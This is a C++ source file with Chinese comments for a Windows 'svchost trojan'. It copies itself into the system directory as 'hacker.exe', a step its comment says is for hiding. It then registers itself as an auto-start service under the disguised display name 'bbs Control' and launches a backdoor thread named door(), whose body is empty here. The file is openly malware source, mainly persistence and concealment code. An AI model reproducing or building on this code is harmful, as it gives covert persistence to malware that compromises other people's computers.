#ifndef SVCHOST_TROJAN_CPP
#define SVCHOST_TROJAN_CPP

//#define SVCHOST_TROJAN_TEST

#include <stdio.h>
#include <WinSock2.h>
#pragma comment(lib,"ws2_32.lib")

void WINAPI serviceMain(DWORD, LPTSTR*);
void WINAPI serviceCtrlHandler(DWORD opCode);
bool installCmdService();
void delServices();
void door();
SERVICE_STATUS m_serviceStatus;
SERVICE_STATUS_HANDLE m_serviceStatusHandle;
bool bRunning = true;
HANDLE hThread;
DWORD dwThreadId;

#ifdef SVCHOST_TROJAN_TEST
int main(int argc,char * argv[])
{
	SERVICE_TABLE_ENTRY dispatchTable[] = 
	{
		{ TEXT("system"), serviceMain },
		{ NULL, NULL }
	};
	if (argc == 2)
	{
		if (!stricmp(argv[1], "-i"))
		{
			installCmdService();
		}
		else if (!stricmp(argv[1], "-r"))
		{
			delServices();
		}
		return 0;
	}

	StartServiceCtrlDispatcher(dispatchTable);//把入口点的地址传入
	return 0;

	return 0;
}
#endif

// 木马主程序入口
void door()
{
	
}

// 服务主函数
void WINAPI serviceMain(DWORD dwArgc, LPTSTR* lpArgv)
{
	// 初始化服务，正在开始
	m_serviceStatus.dwServiceType = SERVICE_WIN32;
	m_serviceStatus.dwCurrentState = SERVICE_START_PENDING;
	// 服务可以接受的请求，这里只接受停止服务请求和暂停恢复请求
	m_serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;
	m_serviceStatus.dwWin32ExitCode = 0;
	m_serviceStatus.dwServiceSpecificExitCode = 0;
	m_serviceStatus.dwCheckPoint = 0;
	m_serviceStatus.dwWaitHint = 0;
	
	m_serviceStatusHandle = RegisterServiceCtrlHandler(TEXT("system"), serviceCtrlHandler);
	// serviceCtrlHandler 服务控制程序，开始、暂停、恢复、停止服务等控制操作
	if (m_serviceStatusHandle == (SERVICE_STATUS_HANDLE)0)
		return;
	//设置服务状态
	m_serviceStatus.dwCurrentState = SERVICE_RUNNING;
	m_serviceStatus.dwCheckPoint = 0;
	m_serviceStatus.dwWaitHint = 0;
	// 必须调用SetServiceStatus() 来响应服务控制程序的每次请求通知，ServiceStatus结构含有7个成员（反映服务的现行状态）。
	// 所有这些成员必须在这个结构被传递到SetServiceStatus之前正确设置
	SetServiceStatus(m_serviceStatusHandle, &m_serviceStatus);
	bRunning = true;
	// 启动线程来启动后门程序 door()
	if (!(hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)door, (LPVOID)0, 0, &dwThreadId)))
		return;
}

// 服务控制函数
void WINAPI serviceCtrlHandler(DWORD opCode)
{
	switch (opCode)
	{
	case SERVICE_CONTROL_PAUSE: //终止
		m_serviceStatus.dwCurrentState = SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE: //继续
		m_serviceStatus.dwCurrentState = SERVICE_RUNNING;
		break;
	case SERVICE_CONTROL_STOP: //暂停
		m_serviceStatus.dwWin32ExitCode = 0;
		m_serviceStatus.dwCurrentState = SERVICE_STOPPED;
		m_serviceStatus.dwCheckPoint = 0;
		m_serviceStatus.dwWaitHint = 0;

		SetServiceStatus(m_serviceStatusHandle, &m_serviceStatus);
		bRunning = false;
		break;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	default:
		break;
	}
}

// 安装服务函数
bool installCmdService()
{
	TCHAR strDir[1024];
	SC_HANDLE schSCManager, schService;
	GetCurrentDirectory(1024, strDir);
	GetModuleFileName(NULL, strDir, sizeof(strDir));
	TCHAR chSysPath[1024];
	GetSystemDirectory(chSysPath, sizeof(chSysPath));
	strcat(chSysPath, TEXT("\\hacker.exe"));
	// 把服务程序复制到系统根目录，便于隐藏
	if (CopyFile(strDir, chSysPath, FALSE))
		printf("Copy file OK\n");
	strcpy(strDir, chSysPath);
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager == NULL)
	{
		printf("open scmanager failed,maybe you do not have the privilage to do this\n");
		return false;
	}
	LPCTSTR lpszBinaryPathName = strDir;
	// 把服务信息添加到SCM的数据库，服务名为hacker，显示的服务名为 bbs Control
	schService = CreateService(schSCManager,
		TEXT("hacker"),
		TEXT("bbs Control"),
		SERVICE_ALL_ACCESS,					// 所有访问权限
		SERVICE_WIN32_OWN_PROCESS,			// 服务类型
		SERVICE_AUTO_START,					// 启动类型
		SERVICE_ERROR_NORMAL,				// 忽略错误处理
		lpszBinaryPathName,					// 访问路径
		NULL,
		NULL,
		NULL,
		NULL,
		NULL);
	if (schService)
		printf("Install service success!\n");
	else
		return false;
	CloseServiceHandle(schService);
	return true;
}

// 删除服务函数
void delServices()
{
	TCHAR name[100];
	SC_HANDLE scm;
	SC_HANDLE service;
	SERVICE_STATUS status;
	strcpy(name, TEXT("system"));
	if ((scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE)) == NULL)
	{
		printf("OpenSCManager Error!\n");
	}
	service = OpenService(scm, name, SERVICE_ALL_ACCESS | DELETE);
	if (!service)
	{
		printf("OpenService error!\n");
		return;
	}
	bool isSucess = QueryServiceStatus(service, &status);
	if (!isSucess)
	{
		printf("QueryServiceStatus error!\n");
		return;
	}

	if (status.dwCurrentState != SERVICE_STOPPED)
	{
		isSucess = ControlService(service, SERVICE_CONTROL_STOP, &status);
		if (!isSucess)
			printf("Stop service error!\n");
		Sleep(500);
	}
	isSucess = DeleteService(service);
	if (!isSucess)
		printf("Delete service fail!\n");
	else
		printf("Delete service success!\n");
	CloseServiceHandle(service);
	CloseServiceHandle(scm);
}
#endif